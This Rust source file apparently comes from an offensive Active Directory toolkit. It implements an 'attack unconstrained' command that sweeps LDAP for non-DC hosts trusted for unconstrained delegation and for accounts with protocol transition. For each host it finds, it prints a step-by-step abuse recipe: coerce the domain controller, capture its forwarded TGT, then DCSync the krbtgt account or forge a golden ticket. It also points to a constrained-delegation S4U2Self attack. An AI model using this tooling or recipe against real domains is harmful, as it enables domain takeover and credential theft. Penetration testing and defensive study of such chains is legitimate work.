//! Unconstrained-delegation recon — LDAP-only sweep for hosts carrying the
//! `TRUSTED_FOR_DELEGATION` UAC bit (0x80000). Also surfaces constrained-with-
//! protocol-transition accounts. Reuses `crate::attacks::scan::ScanArgs` since
//! the collector bind is identical to `scan`.

use anyhow::Result;

use adhammer_collector::Collector;

use crate::attacks::scan::{config, ScanArgs};

/// `attack unconstrained` — locate hosts running with `TRUSTED_FOR_DELEGATION` (UAC bit 0x80000)
/// and print the abuse recipe for each. A domain controller carrying the bit is expected
/// (that's what makes it a DC); a *non-DC* with the bit is the abuse target — every user's TGT
/// that authenticates there is cached, and the DC can be coerced to be one of those users.
///
/// LDAP-only recon; no host is contacted. The exploit chain itself runs in later commands
/// (`attack coerce` for the trigger, capture/extraction to walk off with the TGT).
pub(crate) async fn unconstrained(a: ScanArgs) -> Result<()> {
    use adhammer_core::object::uac;
    /// SERVER_TRUST_ACCOUNT — the UAC bit that marks a computer as a domain controller.
    /// A DC's own delegation bit is not the abuse: it's inherent to being a DC.
    const SERVER_TRUST_ACCOUNT: u32 = 0x0000_2000;

    let snap = Collector::connect(&config(&a)).await?.collect().await?;
    let mut risky: Vec<(&str, &str)> = Vec::new(); // (sAM, DN) of non-DC hosts w/ the bit
    let mut dc_baseline = 0usize;
    let mut proto_transition: Vec<(&str, &str)> = Vec::new(); // constrained w/ protocol transition

    for o in &snap.objects {
        let u = o.uac();
        if u == 0 {
            continue;
        }
        let sam = o.one("sAMAccountName").unwrap_or("");
        let is_dc = u & SERVER_TRUST_ACCOUNT != 0;
        if u & uac::TRUSTED_FOR_DELEGATION != 0 {
            if is_dc {
                dc_baseline += 1;
            } else {
                risky.push((sam, &o.dn));
            }
        }
        if u & uac::TRUSTED_TO_AUTH_FOR_DELEGATION != 0 {
            proto_transition.push((sam, &o.dn));
        }
    }

    println!(
        "== Unconstrained delegation ({} DC baseline, {} risky non-DC host(s)) ==",
        dc_baseline,
        risky.len()
    );
    if risky.is_empty() {
        println!("  (none — only DCs carry TRUSTED_FOR_DELEGATION, which is expected)");
    } else {
        for (sam, dn) in &risky {
            println!("  [!] {sam:<28}  {dn}");
        }
        println!();
        println!("Abuse recipe (once you control one of these hosts):");
        println!("  1. attack coerce --host <DC> --pipe efsrpc  --listener <this-host>");
        println!("     (or --pipe spoolss|netdfs|fssagentrpc)");
        println!("  2. Capture the incoming Kerberos AP-REQ on this host.");
        println!("  3. Extract the forwarded TGT from the Authenticator (GSS-KRB5 Deleg flag).");
        println!("  4. attack dcsync --user krbtgt   (or golden-ticket forge)");
    }

    if !proto_transition.is_empty() {
        println!();
        println!(
            "== Constrained delegation w/ protocol transition ({}) — S4U2Self abuse ==",
            proto_transition.len()
        );
        for (sam, dn) in &proto_transition {
            println!("  {sam:<28}  {dn}");
        }
        println!("  → attack constrained --host <this-host> --target <spn>");
    }
    Ok(())
}
